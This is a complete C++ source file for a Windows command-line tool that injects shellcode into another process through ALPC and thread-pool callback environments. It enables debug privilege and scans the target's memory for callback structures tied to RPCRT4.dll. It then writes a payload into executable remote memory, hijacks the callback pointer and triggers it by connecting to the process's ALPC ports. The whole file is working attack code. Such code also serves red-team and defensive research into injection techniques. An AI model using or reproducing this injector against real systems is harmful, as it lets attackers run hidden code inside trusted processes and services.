/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#pragma warning(disable : 4005)

#define UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlwapi.h>

#include "ntddk.h"

#include <cstdio>
#include <vector>
#include <string>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winspool.lib")
#pragma comment(lib, "shlwapi.lib")

// this structure is derived from TP_CALLBACK_ENVIRON_V3,
// but also includes two additional values. one to hold
// the callback function and callback parameter
typedef struct _TP_CALLBACK_ENVIRON_X {
    ULONG_PTR   Version;
    ULONG_PTR   Pool;
    ULONG_PTR   CleanupGroup;
    ULONG_PTR   CleanupGroupCancelCallback;
    ULONG_PTR   RaceDll;
    ULONG_PTR   ActivationContext;
    ULONG_PTR   FinalizationCallback;
    ULONG_PTR   Flags;
    ULONG_PTR   CallbackPriority;
    ULONG_PTR   Size;
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} TP_CALLBACK_ENVIRON_X;

typedef TP_CALLBACK_ENVIRON_X TP_CALLBACK_ENVIRONX, *PTP_CALLBACK_ENVIRONX;

typedef struct _tp_param_t {
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} tp_param;

typedef struct _process_info_t {
  DWORD                     pid;             // process id
  PWCHAR                    name;            // name of process
  HANDLE                    hp;              // handle of open process
  LPVOID                    payload;         // pointer to shellcode
  DWORD                     payloadSize;     // size of shellcode
  std::vector<std::wstring> ports;           // alpc ports
} process_info;

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) { 
    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
void xfree (LPVOID lpMem) {
    HeapFree (GetProcessHeap(), 0, lpMem);
}

// display error message for last error code
VOID xstrerror (PWCHAR fmt, ...){
    PWCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

// enable or disable a privilege in current process token
BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult)return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
    
    if (bResult) {
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return dwPid;
}

#define MAX_BUFSIZ            8192
#define INFO_HANDLE_ALPC_PORT 45 // only for Windows 10. probably differs for other systems

/**
  Get a list of ALPC ports with names
*/
DWORD GetALPCPorts(process_info *pi) 
{    
    ULONG                      len=0, total=0;
    NTSTATUS                   status;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     hObj;
    PSYSTEM_HANDLE_INFORMATION hl;
    POBJECT_NAME_INFORMATION   objName;
    
    pi->ports.clear();
    
    // get a list of handles for the local system
    for(len=MAX_BUFSIZ;;len+=MAX_BUFSIZ) {
      list = xmalloc(len);
      status = NtQuerySystemInformation(
          SystemHandleInformation, list, len, &total);
      // break from loop if ok    
      if(NT_SUCCESS(status)) break;
      // free list and continue
      xfree(list);   
    }
    
    hl      = (PSYSTEM_HANDLE_INFORMATION)list;
    objName = (POBJECT_NAME_INFORMATION)xmalloc(8192);
    
    // for each handle
    for(i=0; i<hl->NumberOfHandles; i++) {
      // skip if process ids don't match
      if(hl->Handles[i].UniqueProcessId != pi->pid) continue;

      // skip if the type isn't an ALPC port
      // note this value might be different on other systems.
      // this was tested on 64-bit Windows 10
      if(hl->Handles[i].ObjectTypeIndex != 45) continue;
      
      // duplicate the handle object
      status = NtDuplicateObject(
            pi->hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &hObj, 0, 0, 0);
            
      // continue with next entry if we failed
      if(!NT_SUCCESS(status)) continue;
      
      // try query the name
      status = NtQueryObject(hObj, 
          ObjectNameInformation, objName, 8192, NULL);
      
      // got it okay?
      if(NT_SUCCESS(status) && objName->Name.Buffer!=NULL) {
        // save to list
        pi->ports.push_back(objName->Name.Buffer);
      }
      // close handle object
      NtClose(hObj); 
    }
    // free list of handles
    xfree(objName);
    xfree(list);
    return pi->ports.size();
}

// connect to ALPC port
BOOL ALPC_Connect(std::wstring path) {
    SECURITY_QUALITY_OF_SERVICE ss;
    NTSTATUS                    status;
    UNICODE_STRING              server;
    ULONG                       MsgLen=0;
    HANDLE                      h;
    
    ZeroMemory(&ss, sizeof(ss));
    ss.Length              = sizeof(ss);
    ss.ImpersonationLevel  = SecurityImpersonation;
    ss.EffectiveOnly       = FALSE;
    ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

    RtlInitUnicodeString(&server, path.c_str());
    
    status = NtConnectPort(&h, &server, &ss, NULL, 
      NULL, (PULONG)&MsgLen, NULL, NULL);
      
    NtClose(h);
    
    return NT_SUCCESS(status);
}
    
// try inject and run payload in remote process using CBE
BOOL ALPC_deploy(process_info *pi, LPVOID ds, PTP_CALLBACK_ENVIRONX cbe) {
    LPVOID               cs = NULL;
    BOOL                 bInject = FALSE;
    TP_CALLBACK_ENVIRONX cpy;    // local copy of cbe
    SIZE_T               wr;
    tp_param             tp;
    DWORD                i;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(pi->hp, NULL, 
      pi->payloadSize + sizeof(tp_param), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
        // backup CBE
        CopyMemory(&cpy, cbe, sizeof(TP_CALLBACK_ENVIRONX));
        // copy original callback address and parameter
        tp.Callback          = cpy.Callback;
        tp.CallbackParameter = cpy.CallbackParameter;
        // write callback+parameter to remote process
        WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback          = (ULONG_PTR)cs;
        cpy.CallbackParameter = (ULONG_PTR)(LPBYTE)cs + pi->payloadSize;
        // update CBE in remote process
        WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        for(i=0;i<pi->ports.size(); i++) {
          ALPC_Connect(pi->ports[i]);
          // read back the CBE
          ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
          // if callback pointer is the original, we succeeded.
          bInject = (cpy.Callback == cbe->Callback);
          if(bInject) break;
        }
        // restore the original cbe
        WriteProcessMemory(pi->hp, ds, cbe, sizeof(cpy), &wr);
        // release memory for payload
        VirtualFreeEx(pi->hp, cs, 
          pi->payloadSize+sizeof(tp), MEM_RELEASE);
    }
    return bInject;
}

// validates a windows service IDE
BOOL IsValidCBE(HANDLE hProcess, PTP_CALLBACK_ENVIRONX cbe) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // invalid version?
    if(cbe->Version > 5) return FALSE;
    
    // these values shouldn't be empty  
    if(cbe->Pool                 == 0 ||
       cbe->FinalizationCallback == 0) return FALSE;
       
    // these values should be equal
    if ((LPVOID)cbe->FinalizationCallback != 
        (LPVOID)cbe->ActivationContext) return FALSE;
    
    // priority shouldn't exceed TP_CALLBACK_PRIORITY_INVALID
    if(cbe->CallbackPriority > TP_CALLBACK_PRIORITY_INVALID) return FALSE;
    
    // the pool functions should originate from read-only memory
    res = VirtualQueryEx(hProcess, (LPVOID)cbe->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    
    // the callback function should originate from read+execute memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)cbe->Callback, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);
}

BOOL FindEnviron(process_info *pi, LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE               addr = (LPBYTE)BaseAddress;
    SIZE_T               pos;
    BOOL                 bRead, bFound,bInject=FALSE;
    SIZE_T               rd;
    TP_CALLBACK_ENVIRONX cbe;
    WCHAR                filename[MAX_PATH];
    
    // scan memory for CBE
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(TP_CALLBACK_ENVIRONX) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read CBE from writeable memory
      bRead = ReadProcessMemory(pi->hp,
        &addr[pos], &cbe, sizeof(TP_CALLBACK_ENVIRONX), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_ENVIRONX)) continue;
      
      // is this a valid CBE?
      bFound=IsValidCBE(pi->hp, &cbe);
      if(bFound) {
        // obtain module name where callback resides
        GetMappedFileName(pi->hp, (LPVOID)cbe.Callback, filename, MAX_PATH);
        // filter by RPCRT4.dll
        if(StrStrI(filename, L"RPCRT4.dll")!=NULL) {
          wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
          // try run payload using this CBE
          // if successful, end scan
          bInject = ALPC_deploy(pi, addr+pos, &cbe);
          if (bInject) break;
        }
      }
    }
    return bInject;
}

BOOL ALPC_inject(process_info *pi) {
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject=FALSE;
    
    // try open the target process. return on error
    pi->hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);
    if(pi->hp==NULL) return FALSE;

    // obtain a list of ALPC ports. return if none found
    if(!GetALPCPorts(pi)) {
      CloseHandle(pi->hp);
      return FALSE;
    }

    // get memory info
    GetSystemInfo(&si);
    
    // scan virtual memory for this process upto maximum address available    
    for (addr=0; addr<(LPBYTE)si.lpMaximumApplicationAddress;) 
    {
      res = VirtualQueryEx(pi->hp, addr, &mbi, sizeof(mbi));

      // we only want to scan the heap, 
      // but this will scan stack space too.
      // need to fix that..
      if ((mbi.State   == MEM_COMMIT)  &&
          (mbi.Type    == MEM_PRIVATE) && 
          (mbi.Protect == PAGE_READWRITE)) 
      {
        bInject = FindEnviron(pi, mbi.BaseAddress, mbi.RegionSize);
        if(bInject) break;
      }
      // update address to query
      addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(pi->hp);
    return bInject;
}

/**
  read a shellcode from disk into memory
*/
DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

int main(void) {
    PWCHAR       *argv;
    int          argc;
    process_info pi;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc != 3) {
      wprintf(L"usage: alpc <payload> <process id | process name>\n");
      return 0;
    }
    
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"can't enable debug privilege.\n");
    }
    
    // try read pic
    pi.payloadSize = readpic(argv[1], &pi.payload);
    
    if(pi.payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }

    pi.pid=name2pid(argv[2]);
    
    if(pi.pid==0) pi.pid=_wtoi(argv[2]);
    if(pi.pid==0) { 
      wprintf(L"unable to obtain process id for %s\n", argv[2]);
      return 0;
    }
    wprintf(L"ALPC injection : %s\n", 
      ALPC_inject(&pi) ? L"OK" : L"FAILED");
    return 0;
}

